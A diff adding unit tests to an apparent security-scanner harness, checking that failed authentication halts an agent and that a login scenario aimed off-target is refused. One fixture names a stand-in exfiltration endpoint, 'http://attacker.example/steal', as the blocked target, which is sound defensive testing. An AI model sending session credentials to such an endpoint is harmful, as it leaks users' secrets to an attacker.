@@ -10,6 +10,7 @@ import unittest
 
 from dast_harness import Finding, MultiScanRunner, ScanConfig, ScanOutcome, ScanStatus, Severity, Target
 from dast_harness.agent_kit import AgentFinding, Confidence, Evidence, HttpExchange, Probe
+from dast_harness.agent_kit.auth import parse_actors
 from dast_harness.agent_kit.base import Agent
 from dast_harness.agent_runner import AgentRunner, CombinedRunner
 from dast_harness.reporters import ConsoleReporter, JSONReporter, build_report
@@ -162,6 +163,52 @@ class AgentRunnerTests(unittest.TestCase):
         runner = AgentRunner([QuietAgent])
         with self.assertRaises(KeyError):
             runner.get_status("nope")
+
+
+class AuthWiringTests(unittest.TestCase):
+    """A configured identity that fails to authenticate must stop the agent."""
+
+    # Nothing listens here, so every auth attempt fails deterministically.
+    DEAD = "http://127.0.0.1:1"
+
+    def _actors(self):
+        return parse_actors({"actors": {"alice": {
+            "cookies": {"session": "x"},
+            "verify": {"path": "/whoami", "expect_status": 200}}}})
+
+    def test_agent_does_not_run_when_authentication_fails(self):
+        runner = AgentRunner([QuietAgent], actors=self._actors())
+        scan_id = runner.start_scan(Target(self.DEAD))
+        runner.wait(scan_id, timeout=10)
+
+        status = runner.get_status(scan_id)
+        self.assertEqual(status["status"], "failed")
+        # Running anyway would scan logged out and report "nothing found".
+        self.assertEqual(runner.get_results(scan_id), [])
+        record = status["agents"]["quiet"]
+        self.assertFalse(record["auth"]["alice"]["ok"])
+        self.assertIn("인증 실패", record["error"])
+        self.assertTrue(any("인증 실패" in w for w in runner.get_warnings(scan_id)))
+
+    def test_a_scenario_pointing_off_target_is_refused_and_recorded(self):
+        actors = parse_actors({"actors": {"evil": {
+            "login": [{"method": "POST", "path": "http://attacker.example/steal"}],
+            "verify": {"path": "/", "expect_status": 200}}}})
+        runner = AgentRunner([QuietAgent], actors=actors)
+        scan_id = runner.start_scan(Target(LOCAL))
+        runner.wait(scan_id, timeout=10)
+
+        record = runner.get_status(scan_id)["agents"]["quiet"]
+        self.assertEqual(record["status"], "failed")
+        # The safety refusal must survive into the report even though no agent
+        # ran to produce an AgentCompletion.
+        self.assertEqual(record["blocked"][0][0], "http://attacker.example/steal")
+
+    def test_no_actors_means_no_auth_block(self):
+        runner = AgentRunner([QuietAgent])
+        scan_id = runner.start_scan(Target(LOCAL))
+        runner.wait(scan_id, timeout=5)
+        self.assertEqual(runner.get_status(scan_id)["agents"]["quiet"]["auth"], {})
 
 
 class CombinedRunnerTests(unittest.TestCase):
